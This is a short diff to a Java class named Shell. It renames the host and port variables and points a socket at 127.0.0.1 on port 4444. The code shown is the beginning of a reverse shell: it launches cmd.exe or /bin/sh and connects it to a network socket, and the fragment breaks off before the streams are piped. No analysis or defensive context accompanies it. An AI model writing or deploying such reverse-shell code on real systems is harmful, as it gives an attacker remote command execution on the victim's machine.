@@ -8,11 +8,11 @@ public class Shell {
 
     public static void main(String[] args) {
         try {
-            String host = "0.0.0.0";
-            int port = 4444;
+            String Host = "127.0.0.1";
+            int Port = 4444;
             String cmd = System.getProperty("os.name").toLowerCase().contains("win") ? "cmd.exe" : "/bin/sh";
 
-            Socket socket = new Socket(host, port);
+            Socket socket = new Socket(Host, Port);
             Process process = new ProcessBuilder(cmd).redirectErrorStream(true).start();
 
             InputStream processOut = process.getInputStream();
